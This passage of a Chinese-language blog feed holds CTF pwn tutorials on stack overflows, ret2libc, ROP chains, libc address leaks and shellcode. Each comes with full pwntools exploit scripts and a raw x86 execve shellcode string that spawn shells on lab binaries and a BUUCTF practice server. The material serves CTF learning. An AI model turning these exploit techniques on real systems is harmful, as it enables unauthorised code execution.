class="hljs-number">11</span>)<br>payload += p32(pop_ebx_edx) + p32(data_addr) + p32(<span class="hljs-number">0</span>)<br>payload += p32(int80_addr)<br>payload += p32(target)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>这个看上去有点复杂但是，耐心看下来还是很好理解的，32位getshell需要调用execv&gt;（”&#x2F;bin&#x2F;sh”,null,null)，寄存器eax&#x3D;11，ebx&#x3D;”&#x2F;bin&#x2F;sh”，ecx&#x3D;0，edx&#x3D;0，然后再执行int 0x80</p></blockquote><p><strong>然后我们发现函数列表有mprotect,这个函数可以改变段的执行权限,我们可以开启最高权限,执行shellcode</strong><br><img src="https://img2024.cnblogs.com/blog/3340174/202407/3340174-20240709151700303-272022987.png"></p><h2 id="方法三-mprotect配合shellcode"><a href="#方法三-mprotect配合shellcode" class="headerlink" title="方法三 mprotect配合shellcode"></a>方法三 mprotect配合shellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span> , log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr = <span class="hljs-number">0x0806ED40</span><br>pop3_ret = <span class="hljs-number">0x806fcc8</span><br>shellcode = asm(shellcraft.sh())<br>target = <span class="hljs-number">0x80ea000</span><br>binsh_addr = <span class="hljs-number">0x80ec000</span><br><br>payload =  <span class="hljs-number">0x2D</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(mprotect_addr) + p32(pop3_ret)<br>payload += p32(target) + p32(<span class="hljs-number">0x3000</span>) + p32(<span class="hljs-number">0x7</span>)<br>payload += p32(read_addr) + p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(<span class="hljs-built_in">len</span>(shellcode))<br>payload += p32(binsh_addr)<br><br>p.sendline(payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>BUUCTF刷题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mprotect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>用动态链接动态泄露system地址并利用</title>
    <link href="/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/"/>
    <url>/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="已知libc库的情况"><a href="#已知libc库的情况" class="headerlink" title="已知libc库的情况"></a>已知libc库的情况</h2><p><strong>在动态编译的程序中，如果没有对system函数的直接调用，在plt中就不会存在system函数，也就是不能直接知道system函数的地址</strong><br><strong>在解决动态编译的二进制文件之前，需要了解动态链接的基础知识，这个过程叫作lzy-binding。程序对外部函数的调用要求在生成可执行文件时将外部函数链接到程序中链接的方式分为静态链接和动态链接。静态链接得到的可执行文件包含外部函数的全部代码。动态链接得到的可执行文件不包含外部函数的代码，而是在运行时将动态链接库(若干外部函数的集合)加载到内存的某个位置，在发生调用时再去链接库定位所需的函数。</strong></p><p><strong>这里通过几个简单的概念和过程的分析来说明整个过程。</strong></p><ol><li><strong>GOT。GOT是全局偏移量表(Global0fset Table)，用于存储外部函数在内存中的确切地址。GOT存储在数据段(DataSegment)内，可以在程序运行过程中被修改。</strong></li><li><strong>PIT是程序链接表(Procedure Linkage Table)，用来存储外部函数的人口点(entry),换言之，程序会到 PLT 中寻找外部函数的地址。PLT存储在代码段(CodeSegment)内，在运行之前就已经确定并目不会被修改。</strong></li></ol><p><strong>简单来讲，GOT是个数据表，存储的是外部函数的地址，具有读写权限(在FULLRELRO 保护机制开启的时候，没有读写权限):PLT是外部函数的人口表，存储的是每个外部函数的代码，具有执行权限</strong></p><p><strong>当程序在第一次运行的时候，会进入已被转载进内存中的动态链接库中查找对应的函数和地址，并把函数的地址放到got表中，将got表的地址数据映射为plt表的表项；在程序二次运行的时候，就不用再重新查找函数地址，而是直接通过plt表找到got表中函数的地址，从而执行函数的功能了。</strong><br><strong>在首次调用导出函数时，由于未知函数真正地址（这时表现为xxx@plt），去访问plt表中该函数所在的项（为一段代码，三条指令如上图所示），之后去访问GOT表，又跳到PLT[0]的中（代码段）调用函数_dl_runtime_resolve去获取真正的函数地址并修改对应的GOT表项</strong><br><img src="/2024/07/18/hello-world/tem%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/3340174-20240617090937972-1950637749.png" alt="image"><br><strong>还有几点需要注意</strong></p><ol><li><strong>GOT[0] 是.dynamic段的装载地址，.dynamic段包含了动态链接器用来绑定过程地址的信息，比如符号的位置和重定位信息;</strong></li><li><strong>GOT[1] 是动态链接器的标识link_map的地址;</strong></li><li><strong>GOT[2] 包含动态链接器的延迟绑定代码_dl_runtime_resolve的入口点，用于得到真正的函数地址，回写到对应的got表中;</strong></li><li><strong>从 GOT[3] 开始就是函数的地址。</strong><br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240617091001323-1596398842.png" alt="image"></li></ol><p><strong>对于任意两个函数的偏移是固定的，我们可以根据这个来做题，我们需要泄露一个函数地址，根据偏移来计算基地址，这样就能得到我们想要的地址</strong><br><strong>用一道例题来具体说明一下</strong><br>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc3">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc3</a><br><strong>首先查看保护</strong><br><img src="/2024/07/18/hello-world/tem%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/3340174-20240617093004223-234048989.png" alt="image"><br><strong>地址随机化，NX开启</strong><br><strong>IDA反编译，没有发现后门函数，所以我们需要调用动态链接库里面的system来getshell</strong><br><strong>第一步：先泄露函数的一个地址</strong><br><strong>我们发现了栈溢出漏洞和put输出函数，那么我们就可以根据这个函数泄露地址</strong><br><img src="/2024/07/18/hello-world/tem%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/3340174-20240617093608158-885703002.png" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc3&quot;)<br>gdb.attach(p,&quot;b *0x0804854C&quot;)<br>elf = ELF(&quot;./ret2libc3&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)<br><br>gets_got = elf.got[&quot;gets&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>main_addr = 0x0804854E<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload1 = &quot;a&quot; * 0x108 + p32(1)<br>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)<br>p.sendline(payload1)<br></code></pre></td></tr></table></figure><p><strong>根据EXP我们可以看到，通过调用put函数来打印got表中gets的地址，这样gets的地址就泄露成功了</strong><br><strong>第二步:计算偏移</strong><br><strong>我们泄露了gets函数的地址,那么根据它的偏移,就能得到基地址.base_addr&#x3D; 泄露地址 - 减去偏移</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs [python]">leak_addr = u32(p.recv(4))<br>libc_base = leak_addr - libc.symbols[&quot;gets&quot;]<br>libc.address = libc_base<br>log.success(&quot;libc_base:&quot; + hex(libc.address))<br></code></pre></td></tr></table></figure><p><strong>这里的libc.symbosl[‘’]在设置基地址之前得到的是偏移值,在设置基地址之后得到的是实际地址值</strong><br><strong>第三步:攻击</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs [python]">system = libc.symbols[&quot;system&quot;] #得到实际地址值<br>binsh = libc.search(&quot;/bin/sh&quot;).next() #搜索字符串，返回地址<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload2 = &quot;a&quot; * 0x108 + p32(1)<br>payload2 += p32(system) + p32(1) + p32(binsh)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这样一个已知动态链接库的题就写好了,说到这肯定想问,那要是未知呢?别急接着往下看</strong></p><h2 id="未知动态链接库"><a href="#未知动态链接库" class="headerlink" title="未知动态链接库"></a>未知动态链接库</h2><p><strong>对于未知动态链接库,做题方式和已知链接库是大同小异的,无非是确定libc库是什么版本,我们来看一下怎么确定</strong><br><strong>在我现在学习中,有三种方法(实际肯定不止三种,使用自己觉得好用的就行)</strong></p><ol><li>在 github上有个 libc-database 项目，可以使用项目上的方法找出对应版本。</li><li>在网站 <a href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a> 上输入对应的函数名和地址找到 1ibc 版本。</li><li>使用python库libcsearcher</li></ol><p><strong>这里我们说一下第三种</strong></p><ol><li><strong>安装</strong> <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/lieanu/LibcSearcher.git<br><span class="hljs-keyword">cd</span> LibcSearcher<br><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> develop<br></code></pre></td></tr></table></figure></li><li><strong>基本使用</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs [python]">libc = LibcSearcher(&quot;func&quot;,gets_real_addr)             #寻找匹配的libc版本<br>libcbase = gets_real_addr – obj.dump(&quot;func&quot;)            #确定基地址<br>system_addr = libcbase + obj.dump(&quot;system&quot;)            #system 偏移<br>bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移<br><br><br></code></pre></td></tr></table></figure>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc</a><br><strong>普通栈溢出</strong><img src="/2024/07/18/hello-world/tem%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/3340174-20240617122855371-558797507.png" alt="image"><br><strong>这里距离栈底为0x14个字节，但是按照14个字节编写会报错，我们使用cyclic的方法判断溢出，发现距离栈底为0x1c个字节</strong><br><strong>直接上脚本</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>from LibcSearcher import *<br>ret2libc = ELF(&#x27;./1&#x27;)<br>p = process(&#x27;./1&#x27;)<br>p.recvuntil(&#x27;is&#x27;)<br>binsh_addr = int(p.recvuntil(&#x27;\n&#x27; , drop=True) , 16)<br>p.recvuntil(&#x27;is&#x27;)<br>puts_addr = int(p.recvuntil(&#x27;\n&#x27; , drop = True) , 16)<br>libc = LibcSearcher(&#x27;puts&#x27; , puts_addr)<br>base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = base_addr + libc.dump(&#x27;system&#x27;)<br>payload = 32 * b&#x27;a&#x27;  + p32(system_addr) + p32(1) + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><strong>做好使用python3运行，别问我怎么知道的~~~~</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写多个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>我们已经学会了编写单个和两个简单函数的ROP链，在这里我们说一下，编写ROP链多个需要注意的问题</strong><br><strong>之前我们在学习两个函数的ROP时，编写了这样的payload</strong><br><img src="/2024/07/18/hello-world/3340174-20240616164704602-344797676.png"><br><strong>我们当时没有考虑，参数冲突和栈溢出大小，现在我们来说一说</strong><br><strong>举个例子，如果我们上次学习的两个函数的ROP中没有gets函数，而是read函数我们怎么办，read函数有三个参数，如果我们要像以前一样构建payload，那么read的第二个参数，就会和system的第一个参数冲突，导致无法将system 的第一个参数放在栈上，在编写多个函数的ROP中会遇见这样的问题，如何解决呢？</strong></p><hr><p><strong>我们需要用到某个地址上的代码，这种代码的基本形式为pop*n + ret</strong><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240616165524944-784500429.png"><br><strong>运用这些命令就能把参数弹出，有几个参数就用几个pop命令，这里可以使用ROPgadget库来查找这些命令</strong></p><p><img src="/2024/07/18/hello-world/3340174-20240616165816659-2050552870.png"><br><strong>这样我们就可以对上一次学的’编写两个函数的ROP‘进行改变，使其变得更合理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>&quot;&quot;&quot;<br>ROPgadget --binary ./ret2libc2 --only &quot;pop|ret&quot;<br>Gadgets information<br>============================================================<br>0x0804861b : pop ebp ; ret<br>0x08048618 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br>0x0804839d : pop ebx ; ret<br>0x0804861a : pop edi ; pop ebp ; ret<br>0x08048619 : pop esi ; pop edi ; pop ebp ; ret<br>0x08048386 : ret<br>0x0804848e : ret 0xeac1<br><br>Unique gadgets found: 7<br>&quot;&quot;&quot;<br><br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>pop1_ret = 0x0804861b<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + p32(1)<br>payload += p32(gets) + p32(pop1_ret) + p32(bss_addr)<br>payload += p32(system) + p32(pop1_ret) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>这里看一下payload，栈溢出之后控制返回地址为gets，gets的返回地址为pop1_ret，gets的参数的bss段一个地址，在执行完gets后返回pop1_ret执行pop命令使gets的参数出栈，然后执行ret（pop eip）命令，控制EIP为system地址，system也是相同原理</strong></p>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写两个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E4%B8%A4%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<p><strong>学会了编写单个ROP链，今天就进阶一下，学编写俩个函数的ROP链。通过一道例题我们直接上手</strong></p><p>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc2">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc2</a><br><strong>首先我们查看保护</strong><br><img src="/2024/07/18/hello-world/3340174-20240616162753307-1824128142.png"></p><p><strong>IDA反编译发现栈溢出</strong><br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240616162853963-159427535.png"><br><strong>但是没发现&#x2F;bin&#x2F;sh,这是我们就无从下手了，我们要想一个办法创造&#x2F;bin&#x2F;sh这个字符串，我们发现题目有gets函数，那么我们能不能通过gets输入&#x2F;bin&#x2F;sh这个字符串呢，我们来验证一下</strong><br><strong>先通过栈溢出把返回地址覆盖为，gets函数，通过我们以前的学习，我们知道，和gets栈向上两个字就是gets的参数，也即是我们输入参数的地址，这点不理解的可以查一下gets这个函数，我们就不展开了。我们再控制gets的返回地址为system，和system的参数我们不就实现了进入shell了吗，payload如下</strong><br><img src="/2024/07/18/hello-world/3340174-20240616163755624-223068555.png"><br><strong>对于这里的bss段，可以在网上阅读一下相关知识，这样我们是不是就控制了程序进入shell，大家可以仔细揣摩一下，理解了编写脚本就很简单</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&quot;./ret2libc2&quot;)<br>elf = ELF(&quot;./ret2libc2&quot;)<br>system = elf.plt[&quot;system&quot;]<br>gets = elf.plt[&quot;gets&quot;]<br>cmd = &quot;/bin/sh&quot;<br>bss_addr = 0x0804A200<br>p.recvuntil(&quot;ret2libc2\n&quot;)<br>payload = &quot;a&quot; * 0x108 + &quot;junk&quot;<br>payload += p32(gets) + p32(system) + p32(bss_addr) + p32(bss_addr)<br>p.sendline(payload)<br>p.sendline(cmd)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编写单个函数的ROP链</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是ROP链"><a href="#什么是ROP链" class="headerlink" title="什么是ROP链"></a>什么是ROP链</h2><p><strong>在我初识栈溢出那篇博客已经详细的讲了函数的调用过程（基于X86框架），不了解的可以看一下，没有这个理论基础，是学不好ROP的。现在我们说一下什么是ROP</strong>。</p><p><strong>ROP链就是通过返回地址的修改来完成的编程，调用特定的函数的一种编程模式。我们可以联想一下你做的最简单的栈溢出的题，返回地址覆盖system（&#x2F;bin&#x2F;sh）。这种也是一种ROP链，只是最简单的一种，所以说ROP也没有那么高端，说白了就是控制返回地址，控制参数。这篇我们来讲一下怎么控制参数</strong><br><img src="/2024/07/18/hello-world/3340174-20240616144041260-1388826682.png"><br><strong>这是一个main函数调用system（&#x2F;bin&#x2F;sh)的栈分布，把func函数的返回地址覆盖为system的地址，这时候system就会作为一个新的函数进入函数内部，开辟栈帧，执行‘push edp；mov edp，esp；sub esp，0x ’。</strong></p><p><img src="/2024/07/18/hello-world/3340174-20240616144621650-1571408845.png"></p><p><strong>根据我们学习函数调用的理论知识，我们可以知道，这时候对于system函数，a就是它的返回地址，b就是它的参数，所以就可以编写脚本控制b的内容来实现控制参数的传入，下面来小试牛刀</strong></p><p>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc1">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc1</a><br><img src="/2024/07/18/hello-world/3340174-20240616151952080-1202632879.png"></p><p><strong>查看保护，开了地址随机化，开了NX，那我们就不能用Shellcode了，IDA反编译一下，看看怎么个事</strong><br><img src="/2024/07/18/hello-world/3340174-20240616152211336-1481894381.png"></p><p><strong>非常简单的栈溢出，但是没有发现后门函数，所以我们覆盖返回地址为system，传入变量&#x2F;bin&#x2F;sh，shift+F12打开string发现&#x2F;bin&#x2F;sh ，直接编写脚本</strong></p><p><img src="/2024/07/18/hello-world/3340174-20240616152349812-1747878807.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&#x27;./ret2libc1&#x27;)<br>elf = ELF(&#x27;./ret2libc1&#x27;)<br>system_addr = elf.plt[&#x27;system&#x27;]<br>binsh_addr = 0x0804A028<br>p.recvuntil(&#x27;ret2libc1\n&#x27;)<br>payload = 0x108 * b&#x27;a&#x27; + p32(1) + p32(system_addr) + p32(1) + p32(binsh_addr)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Shellcode</title>
    <link href="/2024/07/18/Shellcode/"/>
    <url>/2024/07/18/Shellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是Shellcode"><a href="#什么是Shellcode" class="headerlink" title="什么是Shellcode"></a>什么是Shellcode</h2><p><strong>Shellcode指的是用来完成某个功能的汇编代码，常用的功能就是获取目标系统的shell。在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行Shellcode，就要要求对应的二进制文件没有开启NX保护。利用ret_address返回Shellcode处执行</strong></p><h2 id="怎么生成Shellcode"><a href="#怎么生成Shellcode" class="headerlink" title="怎么生成Shellcode"></a>怎么生成Shellcode</h2><p><strong>Shellcode的生成方法通常有以下几种：</strong></p><ol><li>在pwntools中由shellcraft模块生成</li><li>在<a href="https://www.exploit-db.com/shellcodes/">https://www.exploit-db.com/shellcodes/</a>网站中根据平台和系统的位数获取</li><li>通过Metasploit生成</li></ol><h3 id="1、根据pwntools生成Shellcode"><a href="#1、根据pwntools生成Shellcode" class="headerlink" title="1、根据pwntools生成Shellcode"></a>1、根据pwntools生成Shellcode</h3><p>例题：<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/ret2shellcode</a><br><img src="/2024/07/18/hello-world/40174-20240615224646225-696758059.png"><br>查看保护没有开NX，可以用Shellcode<br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615224824896-1789253128.png"><br>IDA反编译发现栈溢出，直接用Shellcode覆盖main_addr地址控制程序流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>context.arch = &quot;i386&quot;<br>p = process(&#x27;./ret2shellcode&#x27;)<br>p.recvuntil(&quot;ret2shellcode&quot;)<br>target = int(p.recvuntile(&quot;\n&quot;,drop = true) , 16)<br>sc = asm(shellcraft.sh())<br>payload = sc.ljust(0x108 ,&#x27;\x00&#x27;) + p32(1) + p32(target)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>解释：target &#x3D; int(p.recvuntile(“\n”,drop &#x3D; true) , 16)接收直到换行符，并且去除换行符，转换为16进制</strong></p><h2 id="2、Shellcode进阶"><a href="#2、Shellcode进阶" class="headerlink" title="2、Shellcode进阶"></a>2、Shellcode进阶</h2><p>例题：<a href="https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w">https://gitee.com/tky5216/CTF/blob/master/PWN/stack/b0verfl0w</a><br><img src="/2024/07/18/hello-world/40174-20240615225943864-1256445096.png"><br><strong>没有开NX保护，可以使用Shellccode</strong><br><img src="https://img2024.cnblogs.com/blog/3340174/202406/3340174-20240615230113982-2038105599.png"><br><strong>发现溢出十八个字节，非常小，所以用pwntools生成的Shellcode长度太长，这里需要用gadget来控制EIP的位置，跳转到Shellcode的初始地址</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>p = process(&#x27;./b0verfl0w&#x27;)<br><br>shellcode_x86 = &#x27;\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80&#x27;<br>sub_esp_jmp = asm(&#x27;sub esp , 0x28;jmp esp&#x27;)<br>jmp_esp = 0x08048504<br>payload = shellcode_x86.ljust(0x24 , &#x27;a&#x27;) +  p32(jmp_esp) + sub_esp_jmp<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>从payload起始地址开始构造Shellcode，之后调整esp到Shellcode起始位置</strong>、</p><blockquote><p>为什么要用jmp_esp而不是直接用Shellcode覆盖返回地址？<br>当pop main_addr后esp在main_上边，直接执行sub_esp_jmp在栈外执行，会异常，所以我们要把EIP调整到栈内再把EIP控制到sub_esp_jmp这样就没有问题了</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初识栈溢出</title>
    <link href="/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2024/07/18/%E5%88%9D%E8%AF%86%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
